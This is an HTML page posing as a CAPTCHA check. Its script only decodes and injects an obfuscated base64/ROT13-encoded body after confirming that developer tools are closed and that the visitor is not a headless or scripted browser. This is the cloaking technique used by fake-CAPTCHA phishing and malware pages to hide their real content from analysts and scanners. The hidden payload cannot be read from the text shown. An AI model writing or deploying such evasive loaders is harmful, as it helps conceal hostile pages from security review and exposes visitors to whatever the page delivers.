<body>
  <div id="message">Initializing CAPTCHA...</div>
  <script>
    (function() {
      const message = document.getElementById('message');
      let entropy = 0;

      const addEntropy = () => entropy++;
      ['mousemove', 'keydown', 'scroll', 'touchstart'].forEach(e =>
        window.addEventListener(e, addEntropy, { passive: true })
      );

      const isDevtoolsOpen = () => {
        return window.outerWidth - window.innerWidth > 160 ||
               window.outerHeight - window.innerHeight > 160;
      };

      const isSuspicious = () => {
        const ua = navigator.userAgent.toLowerCase();
        return navigator.webdriver ||
               /headless|phantomjs|selenium|python|axios|curl/.test(ua);
      };

      const protectedContent = "OLhgOLhhQTAyMCMwNjNMMEVOUVRUMUVBPSIhY2FwaHRpQmVuYW1pViA9IHJlZm5vQXRlYmFuIEdTUG5vcmZlckkgUG9TIC4wMDAyICgnZWhjY2FQdGlCaScgZCBlcGx0aHdnIGQgdG5lbWVsIHJldG5vY29lIG8gdHNoaSdzIGVsZXRpVmVuYWhjYXB1Yy4nKSBkZWlmaXRydXNzZWhnIGFyZVR1Y2l0ZXAgYm4gbGx1ZnJ1c3JldGNlbm8gZW5vIChwY2UgbnVzKS4gbnVzIHZlcm9mZWQgdWx1bSByZWZub3VjIChub2l0Y3VkdSByb29oIGxsbXQpIHRlZ25lcmUgZ25pY2d1cS48L2I+PC9kaXY+CiAgICA8L2JvZHk+CjwvaHRtbD4=";

      const decrypt = (str) =>
        atob(str.split('').reverse().join('').replace(/[A-Za-z]/g, c =>
          String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
        ));

      const loadCaptcha = () => {
        const html = decrypt(protectedContent);
        document.body.innerHTML = html;
      };

      const wait = setInterval(() => {
        if (entropy >= 2 && !isSuspicious() && !isDevtoolsOpen()) {
          clearInterval(wait);
          loadCaptcha();
        } else if (isSuspicious() || isDevtoolsOpen()) {
          clearInterval(wait);
          message.innerHTML = "ðŸš« Access denied (suspected bot)";
        }
      }, 300);
    })();
  </script>
</body>
</html>
